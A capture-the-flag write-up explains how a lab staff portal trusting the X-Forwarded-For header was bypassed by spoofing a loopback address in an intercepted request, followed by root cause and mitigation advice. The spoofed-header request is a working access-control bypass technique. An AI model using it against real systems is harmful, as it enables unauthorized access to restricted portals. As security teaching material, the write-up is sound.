---
title: "X-Forwarded-For Spoofing – Internal Staff Portal Access Control Bypass | Brackish Brewing Co."
date: 2026-05-22 23:45:00 +0530
categories: [A01 - Broken Access Control, Access Control Bypass]
tags: [broken-access-control, x-forwarded-for, header-spoofing, trust-boundary, proxy-misconfiguration, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/brackish-brewing.webp
  alt: Brackish Brewing Co WebVerse challenge
---

# Lab Link

Lab: [Brackish Brewing Co.](https://dashboard.webverselabs-pro.com/challenges/walk-in)

# Overview

The **Brackish Brewing Co.** challenge demonstrates an **access control flaw caused by trusting client-controlled headers**.

The staff portal was designed to permit access only from internal systems. The application relied on information supposedly added by a load balancer to determine whether requests originated from the internal network.

After infrastructure changes, the assumptions behind the implementation no longer matched reality. The application still trusted network information supplied through HTTP headers.

By spoofing the expected header value, it became possible to impersonate an internal request and bypass access restrictions.

# Objective

Gain access to the staff-only portal and retrieve the flag.

# Vulnerability Classification Hierarchy

```text
OWASP Category
└── A01: Broken Access Control
    └── Trust Boundary Violation
        └── Header-Based Authentication Bypass
            └── X-Forwarded-For Spoofing
```

# Reconnaissance

Initial application mapping revealed:

```text
/tap-list

/visit
```

Additional directory enumeration identified:

```text
/staff
```

Visiting:

```text
/staff
```

returned:

```text
403 · Forbidden · staff-portal

Staff portal — internal network access only.

This portal is internal-network only. If you're seeing this from a personal device, you'll need to access it from the Coalridge office VPN or hit it from the LB hostname — the cloud load balancer is supposed to mark the request as a trusted hop before it gets here.

If you are on the office VPN and still seeing this, grab Hollis. The new load balancer changed how it labels in-network requests after the migration, and the staff handler may be looking for the old loopback marker.
```

The error message disclosed several important details:

- Internal access restrictions existed
- Traffic relied on load balancer information
- Migration changes affected request handling
- The application expected a loopback marker

The message strongly suggested the application was trusting request metadata.

# Analysis

Applications behind reverse proxies frequently use headers such as:

```http
X-Forwarded-For
```

to identify client IP addresses.

Typical flow:

```text
User
   ↓
Load Balancer
   ↓
Application
```

The application appeared to assume:

```text
Requests with loopback IP = internal users
```

However:

```text
HTTP headers are client controlled
```

unless explicitly rewritten and validated by a trusted proxy.

# Exploitation

Burp Suite interception was enabled.

The request to:

```http
GET /staff HTTP/2
```

was modified by adding:

```http
X-Forwarded-For: 127.0.0.1
```

Modified request:

```http
GET /staff HTTP/2
Host: target.com

X-Forwarded-For: 127.0.0.1
```

The modified request was forwarded to the server.

# Proof of Exploitation

The application accepted the spoofed value and treated the request as internal traffic.

Request flow became:

```text
Attacker Request
        ↓
X-Forwarded-For: 127.0.0.1
        ↓
Application trusts header
        ↓
Access granted
```

The browser displayed the staff portal successfully.

Scrolling through the page revealed:

```text
WEBVERSE{.....}
```

Access restrictions were completely bypassed.

# Root Cause

The application likely implemented logic similar to:

```python
if request.headers.get(
    "X-Forwarded-For"
) == "127.0.0.1":

    allow_staff_access()
```

The problem:

```text
X-Forwarded-For
```

is supplied through HTTP requests and can be modified by users.

The application failed to:

- Verify trusted proxy sources
- Validate request origin
- Separate user input from infrastructure metadata
- Establish a secure trust boundary

# Impact

In real-world environments this issue can lead to:

- Administrative portal access
- Authentication bypass
- Internal API exposure
- Sensitive information disclosure
- Privilege escalation
- Complete application compromise

Internal panels frequently assume network location equals trust.

Attackers can exploit that assumption.

# Mitigation

## Never trust client-supplied forwarding headers directly

Bad:

```python
if request.headers["X-Forwarded-For"]=="127.0.0.1":
    allow()
```

Secure:

```python
if request.remote_addr in trusted_proxies:
    client_ip = extract_verified_ip()
```

## Configure trusted proxy chains

Only accept forwarding information from known infrastructure components.

## Use authentication instead of network assumptions

Replace:

```text
Internal IP = trusted user
```

with:

```text
Authenticated user + authorization checks
```

## Strip untrusted forwarding headers

Reverse proxies should overwrite:

```text
X-Forwarded-For
X-Real-IP
Forwarded
```

rather than preserving user-supplied values.

# Real-World Insight

Header spoofing issues commonly appear during penetration tests involving:

- Internal dashboards
- Administrative portals
- Legacy applications
- Reverse proxy migrations
- VPN-restricted systems

A frequent assumption is:

```text
Nobody can modify X-Forwarded-For
```

Attackers interact directly with requests.

Anything originating from the client should be considered untrusted until validated.